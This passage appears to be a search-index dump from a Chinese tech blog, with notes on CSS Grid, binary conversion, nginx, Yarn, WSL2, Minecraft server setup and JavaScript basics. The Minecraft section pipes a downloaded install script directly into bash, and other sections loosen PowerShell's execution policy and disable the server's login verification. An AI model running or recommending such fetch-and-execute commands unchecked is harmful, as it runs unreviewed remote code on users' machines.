2 / span 2; // 在第二行第2列开始，横跨两行两列\nspan关键字是跨域的意思，指的是跨域多少个网格\ngrid-template-areas: \u0026ldquo;a b c\u0026rdquo;; // 指定区域中对应的单元格，如果区域中不需要用到则用点.来表示\ngrid-auto-flow: column; // 设置为先放满列再放行，网格布局，容器的元素会根据顺序进行排列，默认是先放满第一行，再放第二行，而该属性设置为先放满第一列，再放第二列表，默认值为row\n如果有一些元素的大小是不一致，浏览器认为这个位置放不下，会另外起一行放\ngrid-auto-flow: row dense; // 先填满行，而且是尽可能的填满，不留下空隙\ngrid-auto-flow: column dense; // 先填满列，而且是尽可能的填满，不留下空隙\n设置单元格内容的位置\njustify-items: centet; // 水平位置，内容居中\nalign-items: centet; // 垂直位置，内容居中\nstretch：拉伸，占满整个单元格的宽度（默认值） start：对齐单元格的起始位置 end：对齐单元格的结束位置 center：单元格内容居中\n可以简写为place-items: centet centet; // 水平居中，垂直居中，如果只提供一个值，那么水平和垂直都是这个值\n设置单个项目的位置\njustify-self: center; // 设置单个项目在网格中的水平方向位置，居中\nalign-self: center; // 设置单个项目在网格中的垂直方向位置，居中\n和justify-items，align-items类似，只是作用于单个项目\n可简写为place-self: center; // 如果不提供第二个值，那么垂直方向和水平方向都是那个值\n设置网格在容器的位置\njustify-content: center; // 网格在容器水平方向为居中\nalign-content: center; // 网格在容器垂直方向为居中\n属性值和上面的类似\nspace-around // 网格的项目的两侧的距离相等，a项目和b项目的距离是相等，所以实质上项目与项目之间的距离是和容器之间的距离的2倍\nspace-between // 项目和项目之间距离相等，项目和容器没有间隔\nspace-evenly // 项目和项目之间距离相等，项目和容器之间也是相等间隔\n可以简写为place-content: center center; // 水平居中，垂直居中，如果只提供一个值，那么水平和垂直都是这个值\n如果浏览器自动生成一些多余网格，而要设置这些多余网格的行高和列宽\ngrid-auto-columns: 100px; // 多余网格的行高为100px\ngrid-auto-rows: 100px; // 多余网格的列宽为100px\n项目属性定位\ngrid-column-start: 2; // 左边框在第二个项目的垂直线上\ngrid-column-end: 3; // 右边框在第三个项目的垂直线上\ngrid-row-start: 2; // 上边距在第二个项目的水平线上\ngrid-row-end: 3; // 下边距在第三个项目的水平线上\n除了设置项目的定位外，还可以设置网格线的名称\ngrid-column-start: main-start;\n可以简写为\ngrid-column: 2 / 3;\ngrid-row: 2 / 3;\n效果和上面一样\n","permalink":"https://99999.fun/posts/45/","summary":"grid 布局\ngrid布局和flex布局类似，不过grid是最强大的css布局方式\ngrid布局是网格布局\ndisplay: grid; // 定义grid布局，默认为块级元素\ndisplay: inline-grid // 设置为行内元素\n设置为grid布局后，容器的子元素的float（浮动），display: inlne-block（行内块级元素），display: table-cell（表格单元格），vertical-align（垂直对齐方式）之类的全部都会失效\n列宽和行高的设置\ngrid-template-columns: 100px; // 列宽\ngrid-template-rows: 100px; // 行高\n数值也支持百分比\ngrid-template-columns: repeat(3, 100px); // 列宽，重复次数为3，重复的值为100px，和下面效果是一样的\ngrid-template-columns: 100px 100px 100px;\ngrid-template-rows: repeat(auto-fill, 100px); // 行高，自动填充容器，行高为100px\ngrid-template-rows: 1fr 2fr; // 行高，第二个的行高是第一的2倍\ngrid-template-rows: minmax(100px, 300px); // 生成一个长度范围，长度在这个范围内，两个参数分别代表最小值和最大值，这里表示的是行高不小于100px，不大于300px\ngrid-template-rows: auto; // 由浏览器决定行高\ngrid-template-columns: [a1] 100px [a2] 100px [a3] auto; // 方括号[]内的的值是用于指定网格的名称\ngrid-template-columns: 20% 60% 20%; // 左栏20%，中间60%，右栏20%，如果是重复的值搭配repeat使用更佳\ngrid-row-gap: 10px; // 行间距（行与行的距离）","title":"Grid布局学习笔记"},{"content":"box-sizing 盒类型\n该属性是告诉浏览器是以什么盒模型展示的\nIE用的是border-box\n计算方式是外边距+内边距+内容=宽度（高度）\n而像谷歌浏览器之类的用的是content-box\n计算方式是容器的宽度或者高度\nbox-sizing: content-box; // 告诉浏览器是以content-box方式计算\nborder-box // 告诉浏览器是以border-box方式计算\ncss样式优先级\n!important \u0026gt; 内联 \u0026gt; id \u0026gt; 类 \u0026gt; 标签 \u0026gt; 通配符 \u0026gt; 默认样式 \u0026gt; 继承样式\nletter-spacing 字间距\n该属性控制字符之间的距离，字符之间的字符间距，默认值为0\n该属性支持三种类型的数值\npx（像素）\nem（相对值，相对于原来设置的值，如果原来的值为16px，那么1em就是16px，可以理解为倍数）\nrem（和em类似，不过它相对的是html元素，而em是相对于它本身）\n例如：\nletter-spacing: 6px;\ncolumns\n用于指定列宽和列数\n例如：\ncolumns: 100px 3; // 指的是列宽为100px，列数为3\ncolumn-gap\n用于列与列之间的间隔\ncolumn-gap: 30px;\ncolumn-rule\n用于指定列之间的宽度和样式，以及颜色（列的边线）\ncolumn-rule: 6px dashed #ccc;\n可拆分为\ncolumn-rule-width和column-rule-style和column-rule-color\ncolumn-span\n指定元素应横跨多少列\ncolumn-span: 3;\nall为横跨所有列\nmedia 媒体查询\n媒体查询常用于响应式布局，为不同屏幕设置不同的样式\n@media(max-width:768px){} // 当屏幕最大宽度只有768px时应用其下的设置\n检测是否有将系统的主题色设置为亮色或者暗色（安卓开启深色模式也有效，可以用于定义夜间模式等等）\n@media (prefers-color-scheme: dark){} // 暗色\n@media (prefers-color-scheme: light){} // 亮色\nonly元素选择\n.app:only-child // 选择唯一性子元素的.app类元素（必须是唯一性）\n.app:only-of-type // 选择指定类型（.app）的子元素（只要是父元素下有.app类就会选择）\nbefore和after插入（伪类）\n.app:before // 在app类的内容之前插入新的内容\n.app:after // 在app类的内容之后插入新的内容\nnth 元素选择（伪类）\n.app:nth-child(2) // 选择app类的父元素下的第2个子元素\n.app:nth-last-child(2) // 选择app类的父元素下的第2个子元素中的带有.app元素\n.app:nth-of-type(2) // 选择属性app类的父元素下的第2个子元素中的全部同类型的元素\n.app:nth-last-of-type(2) // 选择app类的父元素下倒数的第2个子元素中的带有.app元素\ncalc 计算属性\n动态计算长度\nwidth: calc(80% + 100px); // 宽度等于父元素的80%宽度加上100px\ncss单位：px（像素），em（相对于自身元素），rem（相对于根元素，html元素），vw（1vw等于视口宽度的1%，100vw就是视宽100%），vh（1vh等于视口高度的1%，100vh就是视高的100%）\n注意：vw，vh是相对于视口，包括滚动条，而100%不包括滚动条，因此100%和100vw（vh）有可能是不一致的\nIFC全称Inline Formatting Contexts，中文翻译为行内格式化上下文\n只要块级元素中仅包含内联级元素就会触发IFC机制，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;span\u0026gt;\rhallo\r\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r特性：\n可以根据IFC容器的属性值，对子元素进行排列，例如text-align: center;\n子元素使用float浮动的优先排列\n上下外边距不生效，但是左右外边距生效，IFC机制就是只计算横向样式，不计算纵向样式\nIFC机制常用于文本行高不同，元素垂直显示的问题\n缓动动画公式：(目标值 - 现在的位置) / 10\ncss3原生变量\n声明变量\n#app{\r--textmax: 10px;\r}\rtextmax变量（属性）目前没有任何含义，因此，css变量也叫做css自定义属性，变量名大小写敏感\nvar()函数用于读取变量的值，例如：\n#app{\rfont-size: var(--textmax, 13px);\r}\rvar()的第二个参数是表示变量的默认值，如果这个变量不存在，就使用这个默认值\n注意：和less那些css预处理器不同，css原生变量只能用于属性值，不能用于属性名\n如果变量值是字符串，可以进行拼接，而且变量带有单位，不可写为字符串\n如果变量值是数值，需要calc()函数才能进行拼接，例如：\n#app{\rfont-size: calc(var(--textmax, 13px) + 10px);\r}\r作用域\ncss变量的优先级和css选择器的优先级是一样的， id \u0026gt; 类 \u0026gt; 标签 \u0026gt; 通配符\n粘性布局\nposition: sticky;\n该属性值还处在实验性期间，因此兼容性差的不堪入目\nposition: -webkit-sticky;\rposition: sticky;\rtop: 20px;\r当元素距离视窗顶部的距离大于20px的时候，以relative定位显示，当小于20px的时候，以fixed定位\n触发生效要有top, right, bottom 或 left其中一个值\n注意：当left和right同时设置时，left的优先级高，当top和bottom同时设置，top的优先级高\n而且使用sticky的元素的父节点的overflow属性必须是visible，因为如果设置hidden，那么就无法滚动，就无法生效了，而设置其他relative|absolute|fixed会导致其相对于父元素，而不是相对于视窗定位了\n动画间隔时间公式，因为大多数显示器默认频率是60Hz，即1秒刷新60次，因此最小间隔为1/60*1000ms = 16.7ms\nBootstrap\n由twitter提供，支持Sass变量，v5版本移除JQuery依赖（所以使用v5版本不需要再导入jQuery了）\n使用简单，直接用类名覆盖样式，就可以使用现成由Bootstrap提供的样式\nBootstrap响应式布局用的@media（media query / 媒体查询）\n如果不喜欢部分Bootstrap的样式，也可以自定义（使用sass修改变量）\ncss Modules（class默认局部生效，解决css冲突）\nCSS Modules不是官方规范，也不是浏览器提供的特性，而是依赖于构建工具（例如webpack）\nclass类名是动态生成的，唯一的，并且准确地对应源码的类样式，样式复用通过composes关键字实现\n例如：\n.test{\rcolor: #ccc;\r}\r.demo{\rcomposes: test;\rbox-sizing: border-box;\r}\rlayout viewport，visual viewport，ideal viewport\nlayout viewport是网页布局的区域，因此layout viewport可能大于视窗区域，也可能小于，当缩放为100%时，layout viewport宽度等于视窗的宽度，一般来说不会发生改变，除非布局元素被清除了\nvisual viewport是视窗区域，这个区域随缩放改变\nideal viewport：每个设备的ideal viewport有可能不同，可以理解为设备区域，这个可以手动设置，例如：\n\u0026lt;meta name=\u0026quot;viewport\u0026quot; content=\u0026quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\u0026quot;\u0026gt;\rdevice-width为视窗大小，也就是visual viewport\n上面例子在100%缩放中，ideal viewport的大小（不是指单位）等于设备物理大小\nideal viewport可以通过执行window.screen.width/window.screen.height获得\n在我这里宽度为1463px，那么表示无论设备的物理像素多大，在这里就是用1463px表示\n例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\rbody{\rpadding: 0;\rmargin: 0;\r}\r#app{\rwidth: 1463px;\rheight: 10px;\rbackground-color: #000;\r}\r可以发现app元素布满了视窗宽度，说明在该设备中css的1463px等于100%\ncss的1px不等于设备中的1px，css的1px和设备的尺寸相关，和视窗的缩放有关（实质上都和devicePixelRatio有关）\ndevicePixelRatio（比例） = device pixels（设备物理像素） / device-independent pixels（设备独立像素，例如css的像素）\ndevicePixelRatio比例可直接通过执行window.devicePixelRatio得到（在我这边为1.75，说明css的1px等于设备的1.75px）\nclamp()，限制一个值在最小值，最大值之间，有3个参数，最小值，首选值，最大值\nwidth: clamp(1rem,10px,5rem);\r当首选值在最大和最小之间时，选择首选值\n当首选值比最大值大时，使用最大值\n当首选值比最小值小时，使用最小值\n","permalink":"https://99999.fun/posts/44/","summary":"box-sizing 盒类型\n该属性是告诉浏览器是以什么盒模型展示的\nIE用的是border-box\n计算方式是外边距+内边距+内容=宽度（高度）\n而像谷歌浏览器之类的用的是content-box\n计算方式是容器的宽度或者高度\nbox-sizing: content-box; // 告诉浏览器是以content-box方式计算\nborder-box // 告诉浏览器是以border-box方式计算\ncss样式优先级\n!important \u0026gt; 内联 \u0026gt; id \u0026gt; 类 \u0026gt; 标签 \u0026gt; 通配符 \u0026gt; 默认样式 \u0026gt; 继承样式\nletter-spacing 字间距\n该属性控制字符之间的距离，字符之间的字符间距，默认值为0\n该属性支持三种类型的数值\npx（像素）\nem（相对值，相对于原来设置的值，如果原来的值为16px，那么1em就是16px，可以理解为倍数）\nrem（和em类似，不过它相对的是html元素，而em是相对于它本身）\n例如：\nletter-spacing: 6px;\ncolumns\n用于指定列宽和列数\n例如：\ncolumns: 100px 3; // 指的是列宽为100px，列数为3\ncolumn-gap\n用于列与列之间的间隔\ncolumn-gap: 30px;\ncolumn-rule\n用于指定列之间的宽度和样式，以及颜色（列的边线）\ncolumn-rule: 6px dashed #ccc;\n可拆分为\ncolumn-rule-width和column-rule-style和column-rule-color\ncolumn-span\n指定元素应横跨多少列\ncolumn-span: 3;\nall为横跨所有列\nmedia 媒体查询\n媒体查询常用于响应式布局，为不同屏幕设置不同的样式\n@media(max-width:768px){} // 当屏幕最大宽度只有768px时应用其下的设置","title":"css的一些知识扩展"},{"content":"除2取余，逆序排列\n十进制（整数）转二进制一般使用\u0026quot;除2取余，逆序排列\u0026quot;法：\n1.先使用2整除2进制，得到商和余数\n2.然后再使用2整除商，得到新的商和余数\n3.如此反复进行，直到商为0时为止\n4.把先得到的余数作为二进制的低位，后得到的余数作为二进制的高位，依次排列\n注意：最左边是高位，最右边是低位\n例子： 100/2 = 50余 0 50/2= 25余 0 25/2=12余 1 12/2=6余 0 6/2 = 3余 0 3/2 =1 余 1 1/2=0余 1\n所以100的二进制为1100100\n小数转二进制\n乘2取整，顺序排列\n","permalink":"https://99999.fun/posts/43/","summary":"除2取余，逆序排列\n十进制（整数）转二进制一般使用\u0026quot;除2取余，逆序排列\u0026quot;法：\n1.先使用2整除2进制，得到商和余数\n2.然后再使用2整除商，得到新的商和余数\n3.如此反复进行，直到商为0时为止\n4.把先得到的余数作为二进制的低位，后得到的余数作为二进制的高位，依次排列\n注意：最左边是高位，最右边是低位\n例子： 100/2 = 50余 0 50/2= 25余 0 25/2=12余 1 12/2=6余 0 6/2 = 3余 0 3/2 =1 余 1 1/2=0余 1\n所以100的二进制为1100100\n小数转二进制\n乘2取整，顺序排列","title":"一些常用的进制转换方法"},{"content":"打开网页，发现css没有加载出来，f12一看，content-type: text/plain;，把这个css当文本输出了，浏览器请求到这种类型的文件都不会对其进行处理，而且应该是text/css才对\n先了解一下浏览器是如何处理这些数据的，是怎么区分的\n数据通过http传输协议获取到，然后由web服务器的content-type向浏览器进行指示数据的类型，而mime.types就是用来定义数据文件的类型，用什么格式来进行网页编码（charset=utf-8）\n当web服务器接收到请求时，会依据请求文件的后缀名在服务器的MIME配置文件中找到对应的mime.types，然后根据mime.types来确定content-type，浏览器根据content-type来处理数据\n解决方法：当然是指定mime.types文件，而宝塔的nginx一般是在/www/server/nginx目录下，而mime.types文件一般在nginx目录下的conf目录下，会看到一个叫mime.types的文件和一个叫mime.types.default的文件\n往nginx配置文件上输入 include /www/server/nginx/conf/mime.types; default_type application/octet-stream;\n第一个行指定mime.types，第二行就是默认类型\n然后重启一下nginx服务器，刷新一下网页，看到恢复成content-type: text/css了\n","permalink":"https://99999.fun/posts/39/","summary":"打开网页，发现css没有加载出来，f12一看，content-type: text/plain;，把这个css当文本输出了，浏览器请求到这种类型的文件都不会对其进行处理，而且应该是text/css才对\n先了解一下浏览器是如何处理这些数据的，是怎么区分的\n数据通过http传输协议获取到，然后由web服务器的content-type向浏览器进行指示数据的类型，而mime.types就是用来定义数据文件的类型，用什么格式来进行网页编码（charset=utf-8）\n当web服务器接收到请求时，会依据请求文件的后缀名在服务器的MIME配置文件中找到对应的mime.types，然后根据mime.types来确定content-type，浏览器根据content-type来处理数据\n解决方法：当然是指定mime.types文件，而宝塔的nginx一般是在/www/server/nginx目录下，而mime.types文件一般在nginx目录下的conf目录下，会看到一个叫mime.types的文件和一个叫mime.types.default的文件\n往nginx配置文件上输入 include /www/server/nginx/conf/mime.types; default_type application/octet-stream;\n第一个行指定mime.types，第二行就是默认类型\n然后重启一下nginx服务器，刷新一下网页，看到恢复成content-type: text/css了","title":"记录一次MIME类型错误"},{"content":"Yarn 是一款新的 JavaScript 包管理工具，和npm对比就是速度快，保持一致性，安全\n速度快是因为yarn是并行执行任务，而不是npm那样排队列执行package，而且yarn还可以提供缓存，如果安装过一次package，使用yarn再次安装就会从缓存中获取，而不用再下载一次\n保持一致性：yarn提供了一个lockfile文件来记录要安装的package的版本号，锁定其版本不会出现错误，会生成yarn.lock文件来记录其package的版本号，就连依赖包的版本号都会被记录\n安全：yarn会在每个package被执行时校验其完整性\n实质上yarn本身还是从npm中获取的CLI客户端，还是一样可以获取和发布包\nwindows不允许禁止运行脚本解决方法，管理员打开powershell\nset-ExecutionPolicy RemoteSigned\n安装yarn（全局）\nnpm install yarn -g\n查看全部yarn命令\nyarn help\n检查是否安装成功以及查看版本号\nyarn \u0026ndash;version\n同样也是可以选择升级到yarn2\nyarn版本在v1.22之上 yarn set version berry\nyarn版本在v1.22之下 yarn policies set-version berry\n初始化\nyarn init\n安装一个包（安装package.json里的包依赖，并且将依赖树写入到yarn.lock）\nyarn install\n或者\nyarn\n添加一个包到依赖中\nyarn add 包名@版本号\n如果没有写明版本号，默认安装的是最新的，支持一次性填加多个包，多个包用空格分开\n添加一个包到不同的依赖类别中\n开发环境 yarn add 包名 \u0026ndash;dev\n生产环境 yarn add 包名 \u0026ndash;peer\n全局依赖环境 yarn global add 包名\n更新包到指定版本\nyarn upgrade 包名@版本号\n更新包到最新版本\nyarn upgrade \u0026ndash;latest 包名\n删除包\nyarn remove 包名\n支持一次性删除多个包\n管理依赖缓存\n缓存目录 yarn cache dir\n已缓存的依赖信息 yran cache list\n强制清除本地缓存的依赖 yarn cache clean\n管理依赖配置信息\n输出yarn和npm路径信息 yarn config list\n切换镜像源 yarn config set registry https://registry.npm.taobao.org -g\n查看某个依赖的具体信息 yarn info vue\n搜索项目的某个依赖信息\nyarn why 包名\nyarn run 自定义命令\n自定义命令在package.json中定义\n因为其会生成一个yarn.lock文件，只要保存这个文件，可以在其根目录下执行yarn就会直接下载yarn.lock文件所记录的包\n更新yarn本体\n最新的发布版本 yarn set version latest\n从master分支获取 yarn set version from sources\n从其他分支获取 yarn set version from sources \u0026ndash;branch 1211\n发布包\n先去注册npm账号，https://www.npmjs.com/signup\n第一次发布需要npm adduser一下，需要提供用户名，密码，邮箱，要求源必须是npm官方源\n然后yarn poblish\n启动项目，在项目根目录下执行（反正执行速度比npm快）\nyarn run dev\nyarn.lock和package-lock.json互相转换\n安装synp\nnpm install -g synp\ryarn.lock转换为package-lock.json\nsynp --source-file yarn.lock\rpackage-lock.json转换为yarn.lock\nsynp --source-file package-lock.json\r","permalink":"https://99999.fun/posts/38/","summary":"Yarn 是一款新的 JavaScript 包管理工具，和npm对比就是速度快，保持一致性，安全\n速度快是因为yarn是并行执行任务，而不是npm那样排队列执行package，而且yarn还可以提供缓存，如果安装过一次package，使用yarn再次安装就会从缓存中获取，而不用再下载一次\n保持一致性：yarn提供了一个lockfile文件来记录要安装的package的版本号，锁定其版本不会出现错误，会生成yarn.lock文件来记录其package的版本号，就连依赖包的版本号都会被记录\n安全：yarn会在每个package被执行时校验其完整性\n实质上yarn本身还是从npm中获取的CLI客户端，还是一样可以获取和发布包\nwindows不允许禁止运行脚本解决方法，管理员打开powershell\nset-ExecutionPolicy RemoteSigned\n安装yarn（全局）\nnpm install yarn -g\n查看全部yarn命令\nyarn help\n检查是否安装成功以及查看版本号\nyarn \u0026ndash;version\n同样也是可以选择升级到yarn2\nyarn版本在v1.22之上 yarn set version berry\nyarn版本在v1.22之下 yarn policies set-version berry\n初始化\nyarn init\n安装一个包（安装package.json里的包依赖，并且将依赖树写入到yarn.lock）\nyarn install\n或者\nyarn\n添加一个包到依赖中\nyarn add 包名@版本号\n如果没有写明版本号，默认安装的是最新的，支持一次性填加多个包，多个包用空格分开\n添加一个包到不同的依赖类别中\n开发环境 yarn add 包名 \u0026ndash;dev\n生产环境 yarn add 包名 \u0026ndash;peer\n全局依赖环境 yarn global add 包名\n更新包到指定版本\nyarn upgrade 包名@版本号\n更新包到最新版本\nyarn upgrade \u0026ndash;latest 包名","title":"Yarn包管理工具的简单使用"},{"content":"wsl全称Windows Subsystem for Linux\n打开启动或关闭windows功能，选择虚拟机平台，安装完毕功能，重启\n打开Windows Power Shell，输入\n启用 wsl\ndism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart\n启用虚拟机功能（请务必确保已经开启了虚拟机平台功能）\ndism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart\n下载并且安装Linux内核更新包 https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi\nwsl.exe \u0026ndash;install或者wsl -l -v检查是否安装正常\n切换wsl2为默认\nwsl \u0026ndash;set-default-version 2\nLinux子系统切换为wsl\nwsl \u0026ndash;set-version Ubuntu 2 // Ubuntu为子系统名，2为wsl版本，可以输入wsl -l -v查看\n报错 Installing, this may take a few minutes\u0026hellip;\n解决方法：打开启动或关闭windows功能，选择Linux的Windows子系统，就好了\n开启wsl2不需要开启预览版本！！！\n推荐个Visual Studio Code插件\nRemote - WSL\n可以免密登录Linux子系统，操作Linux子系统里面的数据\n重启wsl\nwin+r+services.msc\n找到Lxssmanager服务，重新启动\n安装运行Linux系统所需要的功能（默认情况下安装ubuntu）\nwsl \u0026ndash;install\n查看可用的Linux发行版\nwsl \u0026ndash;list \u0026ndash;online\n或者\nwsl \u0026ndash;l \u0026ndash;o\n安装指定发行版\nwsl \u0026ndash;install \u0026ndash;d Ubuntu\n查看本地安装发行版的版本以及状态（Running为正在运行中，为停止运行中）\nwsl \u0026ndash;l \u0026ndash;v\n停止运行（启动也很简单，重新执行Ubuntu2004，进入系统，就会启动）\nwsl \u0026ndash;shutdown\n修改默认版本\nwsl \u0026ndash;s Ubuntu-20.04\n卸载本地安装的发行版（全部数据都将清除）\nwsl \u0026ndash;unregister Ubuntu\n更新wsl内核\nwsl \u0026ndash;update\n回滚到wsl内核上一个版本\nwsl \u0026ndash;update rollback\nwsl发行版会将windows认为是挂载，mnt目录就是windows的目录\n导出本地发行版\nwsl \u0026ndash;export Ubuntu-20.04 d:\\ubuntu20.04.tar\n导入（在文件夹中看到vhdx文件，表示导入成功，导入的时候请确保本地没有同名的发行版，如果有需要卸载后导入）\nwsl \u0026ndash;import Ubuntu-20.04 d:\\wsl\\ubuntu d:\\ubuntu20.04.tar\n修改默认登陆用户\nubuntu2004 config \u0026ndash;default -user root\n","permalink":"https://99999.fun/posts/35/","summary":"wsl全称Windows Subsystem for Linux\n打开启动或关闭windows功能，选择虚拟机平台，安装完毕功能，重启\n打开Windows Power Shell，输入\n启用 wsl\ndism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart\n启用虚拟机功能（请务必确保已经开启了虚拟机平台功能）\ndism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart\n下载并且安装Linux内核更新包 https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi\nwsl.exe \u0026ndash;install或者wsl -l -v检查是否安装正常\n切换wsl2为默认\nwsl \u0026ndash;set-default-version 2\nLinux子系统切换为wsl\nwsl \u0026ndash;set-version Ubuntu 2 // Ubuntu为子系统名，2为wsl版本，可以输入wsl -l -v查看\n报错 Installing, this may take a few minutes\u0026hellip;\n解决方法：打开启动或关闭windows功能，选择Linux的Windows子系统，就好了\n开启wsl2不需要开启预览版本！！！\n推荐个Visual Studio Code插件\nRemote - WSL\n可以免密登录Linux子系统，操作Linux子系统里面的数据\n重启wsl\nwin+r+services.msc\n找到Lxssmanager服务，重新启动\n安装运行Linux系统所需要的功能（默认情况下安装ubuntu）\nwsl \u0026ndash;install\n查看可用的Linux发行版\nwsl \u0026ndash;list \u0026ndash;online\n或者","title":"wsl2-windows子系统简单配置"},{"content":"配置ssl证书\n前提是已经申请到ssl证书,并且开放443端口\n编辑nginx.conf\n将443那几行的注释去掉（#）,并且修改\nssl_certificate \u0026ldquo;crt证书的绝对路径\u0026rdquo;; ssl_certificate_key\u0026quot;key证书的绝对路径\u0026quot;;\n如果想访问网站就301重定向到https，那么添加这几行\nserver{\rlisten 80;\rserver_name xiaochenabc123.test.com;\rrewrite ^(.*) https://$host$1 permanent;\r}\r# 当使用80端口访问网站时，将301永久重定向到https://xiaochenabc123.test.com，达到全站https的效果\n然后刷新一下配置nginx -s\nnginx反向代理配置\n将客户端请求转发给内部网络的其他目标服务端，并且将从其他服务端的结果返回到客户端，代理服务端和目标服务端，在外部看起来像是一个整体，只是将请求转发给其他服务端处理，从而达到减轻目标服务端的压力的效果\n配置nginx.conf\nlocation / {\rproxy_pass https://test.xiaochenabc123.test.com; # 反向代理服务器地址\rproxy_connect_timeout 200; # 设置连接超时\rproxy_read_timeout 200; # 设置读响应超时\r}\r重启Nginx服务：service nginx restart\n请求当前服务器时，当前服务器将请求转发给地址为 https://test.xiaochenabc123.test.com 的服务器处理\ngzip压缩\ngzip on;\rgzip_comp_level 1; gzip_min_length 10;\rgzip_http_version 1.1;\rgzip_types text/html text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;\r解释：\ngzip on // gzip开启，关闭是off\ngzip_buffers 16 8k // 设置处理请求压缩的缓冲区数量和大小，一般不会设置，默认\ngzip_comp_level 1 // 设置压缩比，数值1至9，压缩文件越小越吃CPU，最性价比的是1\ngzip_min_length 10 // 当文件超过这个值才启用压缩，单位k，值为0时表示全站压缩\ngzip_http_version 1.1 // 这个1.1是指http版本，只有http/1.1以上才启用gzip，例如http/1.0就不启用\ngzip_types text/html // 指定要压缩的MIME类型，请求不在这个指定内范围的文件不进行压缩\n","permalink":"https://99999.fun/posts/34/","summary":"配置ssl证书\n前提是已经申请到ssl证书,并且开放443端口\n编辑nginx.conf\n将443那几行的注释去掉（#）,并且修改\nssl_certificate \u0026ldquo;crt证书的绝对路径\u0026rdquo;; ssl_certificate_key\u0026quot;key证书的绝对路径\u0026quot;;\n如果想访问网站就301重定向到https，那么添加这几行\nserver{\rlisten 80;\rserver_name xiaochenabc123.test.com;\rrewrite ^(.*) https://$host$1 permanent;\r}\r# 当使用80端口访问网站时，将301永久重定向到https://xiaochenabc123.test.com，达到全站https的效果\n然后刷新一下配置nginx -s\nnginx反向代理配置\n将客户端请求转发给内部网络的其他目标服务端，并且将从其他服务端的结果返回到客户端，代理服务端和目标服务端，在外部看起来像是一个整体，只是将请求转发给其他服务端处理，从而达到减轻目标服务端的压力的效果\n配置nginx.conf\nlocation / {\rproxy_pass https://test.xiaochenabc123.test.com; # 反向代理服务器地址\rproxy_connect_timeout 200; # 设置连接超时\rproxy_read_timeout 200; # 设置读响应超时\r}\r重启Nginx服务：service nginx restart\n请求当前服务器时，当前服务器将请求转发给地址为 https://test.xiaochenabc123.test.com 的服务器处理\ngzip压缩\ngzip on;\rgzip_comp_level 1; gzip_min_length 10;\rgzip_http_version 1.1;\rgzip_types text/html text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;\r解释：\ngzip on // gzip开启，关闭是off","title":"Nginx服务器的一些简单配置"},{"content":"服务器可以使用国内的，保证延迟低，服务器配置一定要高一点，不然很容易Killed\n安装java\ndnf install java-openjdk\n检测java是否安装成功\njava -version\n新建一个目录\nmkdir hallomc\ncd hallomc\n下载第三方mc服务器\nwget -c https://papermc.io/api/v2/projects/paper/versions/1.16.5/builds/553/downloads/paper-1.16.5-553.jar\n这是1.16.5的版本，服务器版本和客户端版本要一致\n历史版本https://papermc.io/legacy\n运行mc服务器\njava -Xmx1024M -Xms512M -jar paper-1.16.5-553.jar\nXmx 代表服务器启动所占的最大运行内存，Xms代表服务器正常运行的最大内存\n一般来说第一次运行都是运行不了，因为没有同意协议\n进入mc目录下，nano eula.txt，把eula=false改成eula=true，然后再运行mc服务器\n24小时运行mc服务端\n一般来说退出ssh登录，就会终止运行mc服务端，可以通过简单建立个“虚拟终端”，来24小时运行\ndnf install screen # 安装screen\nscreen -S mcserver # 创建一个新“终端”，名称自定义\nscreen -R mcserver # 进入这个新“终端”\n如果想退出，可以使用ctrl+a+d\n可以使用screen -ls 命令来查看所有“终端”\n关闭正版验证\n在服务端目录，找到server.properties文件\n修改这个文件，把onlinemode 改为 false\nMCSManager面板\nwget -qO- https://gitee.com/mcsmanager/script/raw/master/setup.sh | bash\n","permalink":"https://99999.fun/posts/33/","summary":"服务器可以使用国内的，保证延迟低，服务器配置一定要高一点，不然很容易Killed\n安装java\ndnf install java-openjdk\n检测java是否安装成功\njava -version\n新建一个目录\nmkdir hallomc\ncd hallomc\n下载第三方mc服务器\nwget -c https://papermc.io/api/v2/projects/paper/versions/1.16.5/builds/553/downloads/paper-1.16.5-553.jar\n这是1.16.5的版本，服务器版本和客户端版本要一致\n历史版本https://papermc.io/legacy\n运行mc服务器\njava -Xmx1024M -Xms512M -jar paper-1.16.5-553.jar\nXmx 代表服务器启动所占的最大运行内存，Xms代表服务器正常运行的最大内存\n一般来说第一次运行都是运行不了，因为没有同意协议\n进入mc目录下，nano eula.txt，把eula=false改成eula=true，然后再运行mc服务器\n24小时运行mc服务端\n一般来说退出ssh登录，就会终止运行mc服务端，可以通过简单建立个“虚拟终端”，来24小时运行\ndnf install screen # 安装screen\nscreen -S mcserver # 创建一个新“终端”，名称自定义\nscreen -R mcserver # 进入这个新“终端”\n如果想退出，可以使用ctrl+a+d\n可以使用screen -ls 命令来查看所有“终端”\n关闭正版验证\n在服务端目录，找到server.properties文件\n修改这个文件，把onlinemode 改为 false\nMCSManager面板\nwget -qO- https://gitee.com/mcsmanager/script/raw/master/setup.sh | bash","title":"Linux环境下简单搭建Minecraft服务器（java版）"},{"content":"JavaScript的变量具有动态性的特性，就决定了变量只是用于保存该特定的值的名字\nJavaScript中有两种，基本类型值和引用类型值\n基本数据类型有数字(Number)，字符串(String)，布尔值(Boolean)，null，undefined，（es6中加入了个symbol）,BigInt(ES2020)\n基本类型是按值访问，可以直接操作保存在变量中的值\n基本类型值是简单的数据段，而引用类型是指由多个值组成的对象\n因为基本类型是按值访问的，所以可以操控保存在变量的值\n引用类型的值是保存在内存中的对象，JavaScript不允许直接访问内存中的位置\n操控对象，其实就是在操控对象的引用，而不是对象本身\nJavaScript的逻辑运算\nJavaScript的任何数据类型都能转换为布尔类型\n\u0026lt; 小于 \u0026gt; 大于 \u0026lt;= 小于或者等于 \u0026gt;= 大于或者等于 == 没错，这个才是等于，=这个是用来赋值的 != 不等于 === 绝对等于（值和数据类型相等） !== 